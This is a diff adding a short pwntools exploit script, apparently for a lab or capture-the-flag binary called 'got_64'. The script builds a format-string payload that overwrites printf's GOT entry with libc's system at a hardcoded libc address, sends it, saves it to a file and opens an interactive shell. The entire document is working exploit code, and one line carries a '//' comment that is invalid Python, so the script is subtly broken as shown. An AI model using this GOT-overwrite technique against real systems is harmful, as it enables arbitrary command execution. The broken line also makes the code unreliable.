@@ -1,0 +1,15 @@
+from pwn import *
+
+context.update(arch="amd64",os="linux")
+elf=ELF("./got_64",checksec=False)
+
+proc=process("./got_64")
+
+libc=elf.libc
+libc.address=0x00007ffff7dd5000                                       // this address changes from the 32 bit exploit
+payload=fmtstr_payload(6,{ elf.got.printf : libc.symbols.system})
+proc.sendline(payload)
+print(payload)
+file=open("form","wb")
+file.write(payload)
+proc.interactive()
